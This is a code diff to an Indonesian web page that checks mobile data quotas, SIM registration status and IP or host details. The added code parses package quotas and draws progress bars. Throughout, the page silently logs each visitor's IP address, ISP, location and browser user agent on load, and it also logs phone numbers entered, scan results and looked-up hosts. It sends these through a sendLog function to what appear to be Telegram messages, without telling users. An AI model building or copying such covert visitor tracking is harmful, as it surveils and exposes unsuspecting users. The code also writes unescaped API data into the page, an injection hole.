@@ -74,6 +74,9 @@
       border-color: #00f3ff;
       box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
     }
+
+    .prog-track { background: rgba(0,0,0,0.6); height: 6px; border-radius: 3px; overflow: hidden; }
+    .prog-fill { height: 100%; box-shadow: 0 0 8px currentColor; transition: width 1s ease; }
   </style>
 </head>
 <body class="min-h-screen flex flex-col pb-24 relative selection:bg-cyber-cyan selection:text-black">
@@ -225,11 +228,11 @@
         <div class="grid grid-cols-2 gap-3">
           <div class="glass-panel p-4 rounded-xl text-center hover:border-cyber-cyan transition-colors group">
             <p class="text-[9px] text-gray-500 font-code tracking-widest mb-1 group-hover:text-cyber-cyan transition-colors">TOTAL KUOTA</p>
-            <p class="text-2xl font-head font-bold text-white" id="totalQuota">0</p>
+            <p class="text-2xl font-head font-bold text-white" id="totalQuota">0 GB</p>
           </div>
           <div class="glass-panel p-4 rounded-xl text-center hover:border-cyber-green transition-colors group">
             <p class="text-[9px] text-gray-500 font-code tracking-widest mb-1 group-hover:text-cyber-green transition-colors">SISA KUOTA</p>
-            <p class="text-2xl font-head font-bold text-cyber-green" id="sisaQuota">0</p>
+            <p class="text-2xl font-head font-bold text-cyber-green" id="sisaQuota">0 GB</p>
           </div>
         </div>
 
@@ -271,8 +274,17 @@
       const codePoints = countryCode.toUpperCase().split('').map(char =>  127397 + char.charCodeAt());
       return String.fromCodePoint(...codePoints);
     }
+    const parseQuota = (str) => {
+       if(!str) return 0;
+       const num = parseFloat(str);
+       const unit = str.toUpperCase();
+       if(unit.includes('GB')) return num;
+       if(unit.includes('MB')) return num / 1024;
+       if(unit.includes('KB')) return num / 1024 / 1024;
+       return 0;
+    }
     
-    // --- FORCE FRESH FETCH (ANTI-CACHE EXTREME) ---
+    // --- FORCE FRESH FETCH (ANTI-CACHE) ---
     const fetchFresh = async (url) => {
       const separator = url.includes('?') ? '&' : '?';
       const randomUrl = `${url}${separator}nocache=${Date.now()}_${Math.random()}`;
@@ -292,7 +304,6 @@
     // --- APP LOGIC ---
     let lastTgMsg = "";
 
-    // STATE HELPERS
     function showLoading(msg = "CONNECTING...") {
         document.getElementById('homeView').classList.add('hidden');
         document.getElementById('resultView').classList.add('hidden');
@@ -315,15 +326,16 @@
         document.getElementById('hostInput').value = '';
     }
 
-    // 1. CEK KUOTA + DUKCAPIL
+    // 1. CEK KUOTA (LOGIC DIPERBAIKI)
     document.getElementById('cekBtn').addEventListener('click', async () => {
       const input = document.getElementById('nomor');
       let val = input.value.trim().replace(/^0/, '62');
       if(val.length < 10) return alert('Nomor tidak valid');
-      showLoading("SCANNING...");
-      document.getElementById('paketContainer').innerHTML = '';
       
-      // Log input action
+      showLoading("SCANNING...");
+      const pkgContainer = document.getElementById('paketContainer');
+      pkgContainer.innerHTML = ''; // Reset container
+      
       sendLog(`<b>🔍 SCANNING...</b>\nTarget: <code>${val}</code>`, 'INPUT');
       
       try {
@@ -333,23 +345,74 @@
         
         const sub = data.data.subs_info;
         
-        // --- DUKCAPIL LOGIC ---
-        // Mencari field status registrasi, default ke aman jika state Active, atau mengambil dari variabel khusus jika ada
-        let dukcapilStatus = "✅ AMAN"; // Default Positif
+        // Status Dukcapil
+        let dukcapilStatus = "✅ AMAN"; 
         if(sub.registration_status) {
              dukcapilStatus = sub.registration_status === 'REGISTERED' ? '✅ AMAN' : '⚠️ CEK';
         } else if(sub.state && sub.state !== 'Active') {
              dukcapilStatus = '⚠️ ' + sub.state;
         }
 
-        // --- RENDER UI ---
+        // Render Header Info
         document.getElementById('resNomor').innerText = sub.msisdn;
         document.getElementById('resExp').innerText = sub.exp_date;
         document.getElementById('resUmur').innerText = sub.tenure || "-";
         document.getElementById('resNet').innerText = sub.net_type || "LTE";
-        document.getElementById('resDukcapil').innerText = dukcapilStatus; // Render Dukcapil
+        document.getElementById('resDukcapil').innerText = dukcapilStatus;
+        
+        document.getElementById('vHp').innerText = sub.device_model || "-";
+        document.getElementById('vLoc').innerText = sub.location || "-";
+        document.getElementById('vKartu').innerText = sub.card_type || "-";
 
-        // ... (Parsing Paket Logic would be here - simplified for brevity as in previous code) ...
+        // --- PARSING PAKET DIKEMBALIKAN ---
+        let totalGB = 0;
+        let sisaGB = 0;
+
+        if (data.data.packages && data.data.packages.length > 0) {
+            data.data.packages.forEach(pkg => {
+                // Kalkulasi Quota
+                const t = parseQuota(pkg.total);
+                const r = parseQuota(pkg.remaining);
+                totalGB += t;
+                sisaGB += r;
+                
+                // Hitung Persentase untuk Progress Bar
+                let percent = 0;
+                if(t > 0) percent = (r / t) * 100;
+                
+                // Tentukan Warna Progress Bar
+                let colorClass = 'text-cyber-green';
+                let bgClass = 'bg-cyber-green';
+                if(percent < 30) { colorClass = 'text-cyber-red'; bgClass = 'bg-cyber-red'; }
+                else if(percent < 70) { colorClass = 'text-cyber-cyan'; bgClass = 'bg-cyber-cyan'; }
+
+                // HTML Card Paket
+                const html = `
+                <div class="glass-panel p-3 rounded-lg border-l-2 ${percent < 30 ? 'border-cyber-red' : 'border-cyber-cyan'} animate-[fadeIn_0.5s]">
+                  <div class="flex justify-between items-start mb-2">
+                    <h4 class="font-bold text-xs text-white uppercase tracking-wider w-3/4">${pkg.name}</h4>
+                    <span class="text-[10px] text-gray-400 font-code">${pkg.exp_date || 'No Exp'}</span>
+                  </div>
+                  
+                  <div class="flex justify-between text-[10px] font-code mb-1">
+                    <span class="text-gray-500">SISA: <span class="${colorClass} font-bold text-sm">${pkg.remaining}</span></span>
+                    <span class="text-gray-600">DARI ${pkg.total}</span>
+                  </div>
+                  
+                  <div class="prog-track w-full bg-gray-800 h-1.5 rounded-full overflow-hidden">
+                    <div class="h-full ${bgClass} shadow-[0_0_10px_currentColor]" style="width: ${percent}%"></div>
+                  </div>
+                </div>`;
+                
+                pkgContainer.innerHTML += html;
+            });
+        } else {
+            pkgContainer.innerHTML = '<div class="text-center text-gray-500 text-xs py-4">TIDAK ADA PAKET AKTIF</div>';
+        }
+
+        // Update Total Display
+        document.getElementById('totalQuota').innerText = totalGB.toFixed(1) + " GB";
+        document.getElementById('sisaQuota').innerText = sisaGB.toFixed(1) + " GB";
 
         // --- SEND LOG HASIL KE TELEGRAM ---
         const logHasil = `<b>✅ HASIL SCAN</b>\n` +
@@ -357,10 +420,10 @@
                          `• Nomor: <code>${sub.msisdn}</code>\n` +
                          `• Masa Aktif: ${sub.exp_date}\n` +
                          `• Status Dukcapil: <b>${dukcapilStatus}</b>\n` +
-                         `• Umur Kartu: ${sub.tenure || "-"}`;
+                         `• Sisa Kuota: <b>${sisaGB.toFixed(1)} GB</b>\n` +
+                         `• Total Paket: ${data.data.packages ? data.data.packages.length : 0}`;
         sendLog(logHasil, 'RESULT');
 
-        // Tampilkan result
         document.getElementById('resultView').classList.remove('hidden');
         document.getElementById('quotaResult').classList.remove('hidden');
         document.getElementById('ipResult').classList.add('hidden');
@@ -383,13 +446,7 @@
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
             const mapLink = `http://maps.google.com/?q=${d.latitude},${d.longitude}`;
-            
-            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n` +
-                          `• Pelaku (Real-Time): <code>${d.ip}</code>\n` +
-                          `• Action: <b>🔍 CEK IP SENDIRI</b>\n` +
-                          `• ISP: ${isp}\n` +
-                          `• Lokasi: ${d.city}, ${d.country} ${flag}\n` +
-                          `• Maps: <a href="${mapLink}">Lihat Peta</a>`;
+            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n• Pelaku: <code>${d.ip}</code>\n• Action: <b>🔍 CEK IP SENDIRI</b>\n• ISP: ${isp}\n• Lokasi: ${d.city}, ${d.country} ${flag}\n• Maps: <a href="${mapLink}">Lihat Peta</a>`;
             sendLog(tgMsg, 'IP_CHECK');
         } catch (e) { showError("Gagal Cek IP. Pastikan koneksi stabil."); }
     });
@@ -421,13 +478,7 @@
             
             const flag = getFlagEmoji(d.country_code);
             const mapLink = `http://maps.google.com/?q=${d.latitude},${d.longitude}`;
-            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n` +
-                          `• Pelaku: <code>${visitorIP}</code>\n` +
-                          `• Action: <b>📡 CEK HOST</b>\n` +
-                          `• Target: <code>${host}</code>\n` +
-                          `• Real IP: <code>${d.ip}</code>\n` +
-                          `• Negara: ${d.country} ${flag}\n` +
-                          `• Maps: <a href="${mapLink}">Lihat Peta</a>`;
+            const tgMsg = `<b>🕵️‍♂️ AKTIVITAS PENGGUNA</b>\n• Pelaku: <code>${visitorIP}</code>\n• Action: <b>📡 CEK HOST</b>\n• Target: <code>${host}</code>\n• Real IP: <code>${d.ip}</code>\n• Negara: ${d.country} ${flag}\n• Maps: <a href="${mapLink}">Lihat Peta</a>`;
             sendLog(tgMsg, 'IP_HOST_CHECK');
         } catch (e) { showError("Gagal Lookup: " + e.message); }
     });
@@ -459,13 +510,10 @@
                       <span class="text-white text-xs">${d.city}, ${d.region}</span>
                    </div>
                    <div class="bg-black/40 p-2 rounded border border-white/5 flex items-center justify-center">
-                      <a href="${mapUrl}" target="_blank" class="text-cyber-cyan text-xs font-bold border border-cyber-cyan px-2 py-1 rounded hover:bg-cyber-cyan hover:text-black transition-colors">
-                        <i class="fa-solid fa-map-location-dot mr-1"></i> BUKA PETA
-                      </a>
+                      <a href="${mapUrl}" target="_blank" class="text-cyber-cyan text-xs font-bold border border-cyber-cyan px-2 py-1 rounded hover:bg-cyber-cyan hover:text-black transition-colors"><i class="fa-solid fa-map-location-dot mr-1"></i> BUKA PETA</a>
                    </div>
                 </div>
-            </div>
-        `;
+            </div>`;
         c.innerHTML = html;
         lastTgMsg = `🔍 ${title}\nIP: ${d.ip}\nISP: ${isp}\nNegara: ${d.country} ${flag}\nKoordinat: ${d.latitude},${d.longitude}`;
     }
@@ -474,7 +522,6 @@
       if(lastTgMsg) { navigator.clipboard.writeText(lastTgMsg); alert('Disalin!'); }
     });
 
-    // LOAD VISITOR INFO (SW REMOVED)
     window.addEventListener('load', async () => { 
         try { 
             const d = await fetchFresh('https://ipwho.is/');
@@ -483,12 +530,7 @@
             const flag = getFlagEmoji(d.country_code);
             const isp = d.connection ? d.connection.isp : (d.isp || "-");
             const mapLink = `http://maps.google.com/?q=${d.latitude},${d.longitude}`;
-            const logVisitor = `<b>👤 PENGUNJUNG BARU (DETAIL)</b>\n` +
-                               `━━━━━━━━━━━━━━━━━━\n` +
-                               `• IP: <code>${d.ip}</code>\n` +
-                               `• ISP: ${isp}\n` +
-                               `• Lokasi: ${d.city}, ${d.country} ${flag}\n` +
-                               `• UA: <i>${navigator.userAgent}</i>`;
+            const logVisitor = `<b>👤 PENGUNJUNG BARU (DETAIL)</b>\n━━━━━━━━━━━━━━━━━━\n• IP: <code>${d.ip}</code>\n• ISP: ${isp}\n• Lokasi: ${d.city}, ${d.country} ${flag}\n• UA: <i>${navigator.userAgent}</i>`;
             sendLog(logVisitor, 'VISITOR'); 
         } catch (e) {} 
     });
